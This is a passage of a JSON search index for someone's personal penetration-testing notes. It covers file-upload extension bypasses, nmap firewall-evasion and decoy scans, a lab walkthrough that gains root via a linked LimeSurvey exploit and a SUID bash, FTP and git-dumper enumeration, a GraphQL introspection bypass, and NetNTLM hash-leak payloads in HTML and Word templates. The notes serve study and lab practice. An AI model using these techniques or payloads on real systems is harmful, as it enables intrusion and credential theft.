extension\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eScript generate extension list :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003evar\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003evar_list\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003evar\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esplit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;, \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ewith\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;extensions.txt\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;w\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003eextension\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003evar_list\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eextension\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eCheck every file that send an echo \u0026ldquo;test\u0026rdquo; :\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ccode\u003eSame technique now check every response that print Demonize or \u0026quot;test\u0026quot;\u003c/code\u003e\u003c/p\u003e","tags":[],"title":"File Upload"},{"content":"#firewall/ips\nSYN-Scan (Example 1): sudo nmap 91.194.100.174 -p 21,22,25 -sS -Pn -n --disable-arp-ping --packet-trace\rACK-Scan (Example 2): sudo nmap 91.194.100.174 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace\rDecoy Scan (Example 3): sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5\rTesting Firewall Rule (Example 4): sudo nmap 91.194.100.174 -n -Pn -p 445 -O\rScan by Using Different Source IP (Example 5): sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0\rSYN-Scan of a Filtered Port (Example 6): sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace\rSYN-Scan From DNS Port (Example 7): sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53\rConnect To The Filtered Port (Example 8): ncat -nv --source-port 53 10.129.2.28 50000\r","date":"2023-09-07","id":46,"permalink":"/notes/ad/tools/firewall-evasion/","summary":"\u003cp\u003e#firewall/ips\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eSYN-Scan (Example 1):\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo nmap 91.194.100.174 -p 21,22,25 -sS -Pn -n --disable-arp-ping --packet-trace\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003cstrong\u003eACK-Scan (Example 2):\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo nmap  91.194.100.174 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003col start=\"3\"\u003e\n\u003cli\u003e\u003cstrong\u003eDecoy Scan (Example 3):\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo nmap 10.129.2.28 -p \u003cspan class=\"m\"\u003e80\u003c/span\u003e -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003col start=\"4\"\u003e\n\u003cli\u003e\u003cstrong\u003eTesting Firewall Rule (Example 4):\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo nmap 91.194.100.174 -n -Pn -p \u003cspan class=\"m\"\u003e445\u003c/span\u003e -O\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003col start=\"5\"\u003e\n\u003cli\u003e\u003cstrong\u003eScan by Using Different Source IP (Example 5):\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo nmap 10.129.2.28 -n -Pn -p \u003cspan class=\"m\"\u003e445\u003c/span\u003e -O -S 10.129.2.200 -e tun0\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003col start=\"6\"\u003e\n\u003cli\u003e\u003cstrong\u003eSYN-Scan of a Filtered Port (Example 6):\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003col start=\"7\"\u003e\n\u003cli\u003e\u003cstrong\u003eSYN-Scan From DNS Port (Example 7):\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port \u003cspan class=\"m\"\u003e53\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003col start=\"8\"\u003e\n\u003cli\u003e\u003cstrong\u003eConnect To The Filtered Port (Example 8):\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003encat -nv --source-port \u003cspan class=\"m\"\u003e53\u003c/span\u003e 10.129.2.28 \u003cspan class=\"m\"\u003e50000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Firewall Evasion"},{"content":"#Docker Scan :\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4ed7eb69ce06654281701b631b1ce234 (ECDSA) |_ 256 c1c607cff025ddde5f9c3f71f158bd8d (ED25519) 80/tcp open http Apache httpd 2.4.56 |_http-title: 403 Forbidden |_http-server-header: Apache/2.4.56 (Debian)\rSetup a mysql server with docker compose try to avoid the user root , then finish the installation and follow this github to get a shell : https://github.com/Y1LD1R1M-1337/Limesurvey-RCE/blob/main/exploit.py\nWe exec env and get : pass \u0026ndash;\u0026gt; 5W5HN4K4GCXf9E\nUser: VL{426b3b0a5425049b64219e9aeff3aa48}\nWe enumerate the docker with : https://github.com/stealthcopter/deepce and find a shared folder between the host and the docker so we upload a /bin/bash with these perm : chmod u+s run chmod +x run\rWe can then connect with ssh exec the bash file to get the root : ./run -p # to keep the privileges\rRoot: VL{d75a070fbff631e40b21c99aea5d0a1a}\n","date":"2023-09-07","id":47,"permalink":"/notes/lab/vulnlab/forgotten/","summary":"\u003cp\u003e#Docker\nScan :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT   STATE SERVICE VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e protocol 2.0\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssh-hostkey:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e256\u003c/span\u003e 4ed7eb69ce06654281701b631b1ce234 \u003cspan class=\"o\"\u003e(\u003c/span\u003eECDSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  \u003cspan class=\"m\"\u003e256\u003c/span\u003e c1c607cff025ddde5f9c3f71f158bd8d \u003cspan class=\"o\"\u003e(\u003c/span\u003eED25519\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp open  http    Apache httpd 2.4.56\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: \u003cspan class=\"m\"\u003e403\u003c/span\u003e Forbidden\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Apache/2.4.56 \u003cspan class=\"o\"\u003e(\u003c/span\u003eDebian\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eSetup a mysql server  with docker compose try to avoid the user root , then finish the installation and follow this github to get a shell : https://github.com/Y1LD1R1M-1337/Limesurvey-RCE/blob/main/exploit.py\u003c/p\u003e","tags":[],"title":"Forgotten"},{"content":" SSH port open + credential : Check if your are able to upload files , if you can create a .ssh folder and upload a authorized_keys file in it .\nUnauthenticated enumeration with nmap :\nsudo nmap -sV -p21 -sC -A 10.10.10.10\rAnonymous login : anonymous : anonymous anonymous : ftp : ftp ftp ftp://anonymous:anonymous@$t/\rDownload everything : wget -m ftp://anonymous:anonymous@$t\r","date":"2023-09-07","id":48,"permalink":"/notes/services/ftp/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eSSH port open + credential   :\nCheck if your are able to upload files  ,  if you can create a .ssh folder and upload a authorized_keys file in it .\u003c/p\u003e","tags":[],"title":"FTP"},{"content":"#git\nTools : wget https://github.com/arthaud/git-dumper\rRun git dumper : ./git_dumper.py http://website.com/.git ~/website\rRecover files : git status git restore --staged \u0026lt;files\u0026gt; git restore \u0026lt;file\u0026gt;\rGet logs : git checkout git log git show a8673b295eca6a4fa820706d5f809f1a8b49fcba`\r","date":"2023-09-07","id":49,"permalink":"/notes/web/git/","summary":"\u003cp\u003e#git\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTools :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/arthaud/git-dumper\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eRun git dumper :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./git_dumper.py http://website.com/.git ~/website\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eRecover files :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit status \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit restore --staged \u0026lt;files\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit restore \u0026lt;file\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eGet logs :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit checkout\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit show a8673b295eca6a4fa820706d5f809f1a8b49fcba\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Git"},{"content":"","date":"2023-09-07","id":50,"permalink":"/notes/code/go/","summary":"","tags":[],"title":"Go"},{"content":" Introspection : { \u0026#34;query\u0026#34;:\u0026#34;query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}\u0026#34; }\rBypass with the return(__shema \u0026amp;\u0026amp; __type) : query%7b__schema%0a%7bqueryType%7bname%7dmutationType%7bname%7dsubscriptionType%7bname%7dtypes%7b...FullType%7ddirectives%7bname%20description%20locations%20args%7b...InputValue%7d%7d%7d%7dfragment%20FullType%20on%20__Type%7bkind%20name%20description%20fields(includeDeprecated%3atrue)%7bname%20description%20args%7b...InputValue%7dtype%7b...TypeRef%7disDeprecated%20deprecationReason%7dinputFields%7b...InputValue%7dinterfaces%7b...TypeRef%7denumValues(includeDeprecated%3atrue)%7bname%20description%20isDeprecated%20deprecationReason%7dpossibleTypes%7b...TypeRef%7d%7dfragment%20InputValue%20on%20__InputValue%7bname%20description%20type%7b...TypeRef%7ddefaultValue%7dfragment%20TypeRef%20on%20__Type%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%7d%7d%7d%7d%7d%7d%7d%7d\r","date":"2023-09-07","id":51,"permalink":"/notes/web/graphsql/","summary":"\u003cul\u003e\n\u003cli\u003eIntrospection :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sql\" data-lang=\"sql\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;query\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"err\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eBypass with the return(__shema \u0026amp;\u0026amp; __type) :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003equery%7b__schema%0a%7bqueryType%7bname%7dmutationType%7bname%7dsubscriptionType%7bname%7dtypes%7b...FullType%7ddirectives%7bname%20description%20locations%20args%7b...InputValue%7d%7d%7d%7dfragment%20FullType%20on%20__Type%7bkind%20name%20description%20fields\u003cspan class=\"o\"\u003e(\u003c/span\u003eincludeDeprecated%3atrue\u003cspan class=\"o\"\u003e)\u003c/span\u003e%7bname%20description%20args%7b...InputValue%7dtype%7b...TypeRef%7disDeprecated%20deprecationReason%7dinputFields%7b...InputValue%7dinterfaces%7b...TypeRef%7denumValues\u003cspan class=\"o\"\u003e(\u003c/span\u003eincludeDeprecated%3atrue\u003cspan class=\"o\"\u003e)\u003c/span\u003e%7bname%20description%20isDeprecated%20deprecationReason%7dpossibleTypes%7b...TypeRef%7d%7dfragment%20InputValue%20on%20__InputValue%7bname%20description%20type%7b...TypeRef%7ddefaultValue%7dfragment%20TypeRef%20on%20__Type%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%7d%7d%7d%7d%7d%7d%7d%7d\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Graphsql"},{"content":"Internet Explorer \u0026amp; Edge While the dir command can be used to leak hashes, it is not very convenient method for an attacker. A more likely scenario would be if the attacker entices the victim to visit the attacker\u0026rsquo;s website or open a specially crafted file. As is widely known, Internet Explorer can leak NetNTLM hashes to websites containing embedded content (eg, images, stylesheets) loaded from a UNC path. This also applies to Microsoft Edge, which can be abused in the same way. This can be tested using the following HTML:\nleak.htm:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;img src=\u0026#34;file://\u0026lt;responder ip\u0026gt;/leak/leak.png\u0026#34;/\u0026gt; \u0026lt;/html\u0026gt;\rOffice Another well-known attack is by abusing Office. Office documents can contain links to external content that when pointed to a network share can result in disclosing NetNTLM hashes. For example, a Word document can contain a link to a template file located on a share. The template file can be set via the word\\_rels\\settings.xml.rels file located in the DOCX file.\nword_rels\\settings.xml.rels:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt; \u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\u0026#34; Target=\u0026#34;file://\u0026lt;responder ip\u0026gt;/leak/Template.dotx\u0026#34; 